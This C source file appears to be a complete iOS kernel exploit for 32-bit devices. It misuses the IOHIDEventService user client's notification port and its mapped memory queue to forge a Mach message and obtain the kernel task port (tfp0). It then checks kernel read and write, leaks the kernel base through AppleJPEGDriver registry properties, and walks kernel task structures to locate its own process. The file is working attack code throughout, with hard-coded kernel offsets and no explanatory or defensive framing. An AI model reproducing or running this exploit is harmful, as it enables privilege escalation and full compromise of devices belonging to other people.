#include "common.h"
#include "util.h"
#include "memory.h"
#include "exploit.h"

kinfo_t *kinfo = NULL;

int init_kernel_base(void) {
    mach_port_t main_port = MACH_PORT_NULL;
    host_get_io_master(mach_host_self(), &main_port);
    io_service_t service = IOServiceGetMatchingService(main_port, IOServiceMatching("AppleJPEGDriver"));
        
    kern_return_t rv = -1;
    io_connect_t client = 0;
    char prop_str[1024] = "<dict><key>" "1234" "</key>" "<integer size=\"1024\">08022017</integer></dict>";
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, prop_str, strlen(prop_str)+1, &rv, &client);
        
    io_object_t object = MACH_PORT_NULL;
    mach_port_t iter = MACH_PORT_NULL;
    vm_address_t test_base = 0;
    IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
    
    while ((object = IOIteratorNext(iter)) != 0) {
        char buf[4096] = {0};
        uint32_t size = sizeof(buf);
        
        if (IORegistryEntryGetProperty(object, "1234", buf, &size) == 0) {
            vm_address_t test_addr = *(vm_address_t *)&buf[9*sizeof(vm_address_t)];
            test_base = (test_addr & 0xfff00000) + 0x1000;
            IOObjectRelease(iter);
            IOServiceClose(client);
            
            kinfo->static_base = 0x80001000;
            kinfo->kernel_base = test_base;
            kinfo->kernel_slide = kinfo->kernel_base - kinfo->static_base;
            return 0;
        }
        
        IOObjectRelease(object);
    }
    
    IOObjectRelease(iter);
    IOServiceClose(client);
    return -1;
}

void init_offsets(void) {
    kinfo->offsets.task.vm_map = 0x18;
    kinfo->offsets.task.next = 0x1c;
    kinfo->offsets.task.prev = 0x20;
    kinfo->offsets.task.itk_self = 0x9c;
    kinfo->offsets.task.itk_space = 0x198;
    kinfo->offsets.task.bsd_info = 0x1e0;
    
    kinfo->offsets.ucred.cr_svuid = 0x14;
    kinfo->offsets.ucred.cr_svgid = 0x60;
    
    kinfo->offsets.vm_named_entry.object = 0xc;
    kinfo->offsets.vm_named_entry.offset = 0x10;
    kinfo->offsets.vm_named_entry.size = 0x18;

    kinfo->offsets.ipc_port.io_bits = 0x0;
    kinfo->offsets.ipc_port.io_references = 0x4;
    kinfo->offsets.ipc_port.ip_receiver = 0x40;
    kinfo->offsets.ipc_port.ip_kobject = 0x44;
    kinfo->offsets.ipc_port.ip_srights = 0x5c;

    kinfo->offsets.proc.pid = 0x8;
    kinfo->offsets.proc.p_fd = 0x90;
    kinfo->offsets.proc.ucred = 0x84;

    kinfo->offsets.ipc_space.is_table = 0x14;
    kinfo->offsets.ipc_entry.size = 0x10;
}

int set_report_interval(mach_port_t port, int value) {
    CFNumberRef num = CFNumberCreate(NULL, kCFNumberIntType, &value);
    int rv = IOConnectSetCFProperty(port, CFSTR("ReportInterval"), num);
    CFRelease(num);
    return rv;
}

void hid_create_user_device(mach_port_t client) {
    uint64_t input_scalar[16] = {0};
    char input_struct[4096] = {0};
    uint64_t output_scalar[16] = {0};
    char output_struct[4096] = {0};

    uint32_t input_scalar_count = 1;
    size_t input_struct_count = 0;
    uint32_t output_scalar_count = 0;
    size_t output_struct_count = 0;
    
    IOConnectCallMethod(client, 0, input_scalar, input_scalar_count, input_struct, input_struct_count,
                        output_scalar, &output_scalar_count, output_struct, &output_struct_count);
}

int run_exploit(void) {
    uint64_t start = mach_absolute_time();
    if (iosurface_init() != 0) return -1;
    kinfo = calloc(1, sizeof(kinfo_t));
    init_offsets();

    mach_port_t service_list = MACH_PORT_NULL;
    mach_port_t iter = MACH_PORT_NULL;
    mach_port_t io_main_port = MACH_PORT_NULL;
    host_get_io_master(mach_host_self(), &io_main_port);
    if (!MACH_PORT_VALID(io_main_port)) goto done;

    IOServiceGetMatchingServices(io_main_port, IOServiceMatching("IOHIDEventService"), &service_list);
    while ((iter = IOIteratorNext(service_list)) != 0) {
        CFStringRef bundle = IORegistryEntryCreateCFProperty(iter, CFSTR("CFBundleIdentifier"), NULL, 0);
        if (bundle != NULL) {
            if (CFEqual(bundle, CFSTR("com.apple.driver.AppleEmbeddedGyro")) || CFEqual(bundle, CFSTR("com.apple.driver.AppleEmbeddedAccelerometer"))) {
                IOServiceOpen(iter, mach_task_self(), 0, &kinfo->hid_client);
                if (kinfo->hid_client != MACH_PORT_NULL) break; 
            }
        }

        IOObjectRelease(iter);
    }

    if (kinfo->hid_client == MACH_PORT_NULL) goto done;
    printf("[*] hid_client: 0x%x\n", kinfo->hid_client);
    hid_create_user_device(kinfo->hid_client);

    mach_port_t notification_port = MACH_PORT_NULL;
    mach_port_t task_self = mach_task_self();
    vm_address_t queue_addr = 0x41000000;
    vm_size_t queue_size = 0x1000;
    uint64_t ref[8] = {0};

    mach_port_allocate(task_self, MACH_PORT_RIGHT_RECEIVE, &notification_port);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, notification_port, (uintptr_t)ref);
    IOConnectMapMemory(kinfo->hid_client, 0, task_self, &queue_addr, &queue_size, 1);

    set_report_interval(kinfo->hid_client, 1);
    mach_msg_header_t *mapped_msg = (mach_msg_header_t *)(queue_addr + queue_size + 0x4);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, mach_host_self(), (uintptr_t)ref);
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, mach_host_self(), (uintptr_t)ref);
    
    uint32_t host_port_addr = mapped_msg->msgh_remote_port;
    io_main_port = MACH_PORT_NULL;
    host_get_io_master(mach_host_self(), &io_main_port);
    printf("[*] host_port_addr: 0x%x\n", host_port_addr);

    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, io_main_port, (uintptr_t)ref);
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, service, (uintptr_t)ref);

    service = IOServiceGetMatchingService(0, IOServiceMatching("IOHIDResource"));
    io_connect_set_notification_port_copy_send(kinfo->hid_client, 0, service, (uintptr_t)ref);
    IOConnectSetNotificationPort(kinfo->hid_client, 0, notification_port, (uintptr_t)ref);

    uint32_t saved_bits = mapped_msg->msgh_bits;
    uint32_t saved_local_port = mapped_msg->msgh_local_port;
    uint32_t saved_msgh_id = mapped_msg->msgh_id;
    uint32_t target_port_addr = host_port_addr - 0x770 + (0x70 * 13);
    printf("[*] target_port_addr: 0x%x\n", target_port_addr);

    mapped_msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, 0);
    mapped_msg->msgh_local_port = target_port_addr;
    mapped_msg->msgh_id = 0x12341234;
    printf("[*] notification_port: 0x%x\n", notification_port);

    mach_msg_header_t *reply = calloc(1, 0x1000);
    reply->msgh_local_port = notification_port;
    reply->msgh_size = 0x1000;

    mach_msg(reply, MACH_RCV_MSG|MACH_RCV_TIMEOUT, 0, 0x1000, notification_port, 20000, MACH_PORT_NULL);
    set_report_interval(kinfo->hid_client, 5428500);

    kinfo->tfp0 = reply->msgh_remote_port;
    uint32_t ktype = 0;
    mach_vm_address_t kaddr = 0;
    pid_t pid = -1;
    
    mach_port_kobject(task_self, kinfo->tfp0, &ktype, &kaddr);
    pid_for_task(kinfo->tfp0, &pid);
    printf("[*] ktype: 0x%x\n", ktype);
    printf("[*] pid: %d\n", pid);
    if (ktype != 2 || pid != 0) {
        kinfo->tfp0 = MACH_PORT_NULL;
        goto done;
    }
 
    printf("[*] tfp0: 0x%x\n", kinfo->tfp0);
    mapped_msg->msgh_bits = saved_bits;
    mapped_msg->msgh_local_port = saved_local_port;
    mapped_msg->msgh_id = saved_msgh_id;

    uint64_t new_ref[8] = {0};
    IOConnectSetNotificationPort(kinfo->hid_client, 0, MACH_PORT_NULL, (uintptr_t)new_ref);
    mach_vm_deallocate(mach_task_self(), queue_addr, queue_size);
    mach_port_destroy(mach_task_self(), notification_port);
    mach_port_destroy(mach_task_self(), kinfo->hid_client);
    free(reply);
    
    uint32_t test_read = 0;
    uint32_t test_val = 0x41414141;
    uint32_t test_alloc = task_alloc(kinfo->tfp0, 0x1000);
    if (test_alloc == 0) goto done;
    printf("[*] test_alloc: 0x%x\n", test_alloc);

    task_write(kinfo->tfp0, test_alloc, &test_val, 4);
    task_read(kinfo->tfp0, test_alloc, &test_read, 4);
    if (test_read != test_val) goto done;
    printf("[*] test_read: 0x%x\n", test_read);
    
    if (init_kernel_base() != 0) goto done;
    printf("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
    printf("[*] kernel_slide: 0x%x\n", kinfo->kernel_slide);
    
    kinfo->kern_task_addr = kread32(target_port_addr + koffsetof(ipc_port, ip_kobject));
    kinfo->kern_proc_addr = kread32(kinfo->kern_task_addr + koffsetof(task, bsd_info));
    kinfo->kern_vm_map = kread32(kinfo->kern_task_addr + koffsetof(task, vm_map));
    
    printf("[*] kern_task_addr: 0x%x\n", kinfo->kern_task_addr);
    printf("[*] kern_proc_addr: 0x%x\n", kinfo->kern_proc_addr);
    printf("[*] kern_vm_map: 0x%x\n", kinfo->kern_vm_map);

    uint32_t current_proc = 0;
    uint32_t current_task = kinfo->kern_task_addr;
    pid_t self_pid = getpid();
    pid_t current_pid = 0;
    
    while (current_task != 0) {
        current_proc = kread32(current_task + koffsetof(task, bsd_info));
        if (current_proc == 0) break;
        
        current_pid = kread32(current_proc + koffsetof(proc, pid));
        if (current_pid == self_pid) {
            kinfo->self_task_addr = current_task;
            kinfo->self_proc_addr = current_proc;
            break;
        }
        
        current_task = kread32(current_task + koffsetof(task, next));
        if (current_task == kinfo->kern_task_addr) break;
    }

    printf("[*] self_task_addr: 0x%x\n", kinfo->self_task_addr);
    printf("[*] self_proc_addr: 0x%x\n", kinfo->self_proc_addr);
    
    uint64_t end = mach_absolute_time();
    mach_timebase_info_data_t info = {0};
    mach_timebase_info(&info);
    uint64_t final_time = ((double)(end - start) * info.numer / info.denom) / 1000000;
    printf("[*] done in %llu ms\n", final_time);

done:
    if (kinfo == NULL) return -1;
    if (!MACH_PORT_VALID(kinfo->tfp0)) {
        bzero(kinfo, sizeof(kinfo_t));
        free(kinfo);
        return -1;
    }
    return 0;
}
